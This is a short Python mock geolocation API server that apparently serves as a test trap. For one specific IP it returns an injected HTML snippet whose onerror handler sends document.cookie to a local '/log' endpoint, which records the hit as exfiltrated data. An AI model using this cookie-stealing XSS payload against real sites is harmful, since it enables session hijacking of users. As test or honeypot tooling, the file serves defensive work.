#!/usr/bin/env python3
import json
import logging
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')

class MockGeoAPIHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = urlparse(self.path)
        if parsed.path == '/geo':
            qs = parse_qs(parsed.query)
            ip = qs.get('ip', [''])[0]
            
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            
            # Normal payload
            flag_html = f"<img src='/flags/{ip}.png' class='flag-icon'/>"
            country = "Unknown"
            
            # The XSS Trap
            if ip == '192.168.1.100':
                flag_html = "<img src='x' onerror='fetch(\"http://localhost:8080/log?data=\"+document.cookie)' class='flag-icon'/>"
                country = "Trapville"
            
            response = {
                "ip": ip,
                "country": country,
                "flag_html": flag_html
            }
            self.wfile.write(json.dumps(response).encode())
        else:
            self.send_response(404)
            self.end_headers()

    def do_POST(self):
        if self.path.startswith('/log'):
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length)
            logging.warning(f"HONEYPOT HIT! Exfiltrated data received: {post_data.decode('utf-8')[:500]}")
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"OK")
        else:
            self.send_response(404)
            self.end_headers()

if __name__ == '__main__':
    server_address = ('', 8080)
    httpd = HTTPServer(server_address, MockGeoAPIHandler)
    logging.info('Starting mock API server on port 8080...')
    httpd.serve_forever()
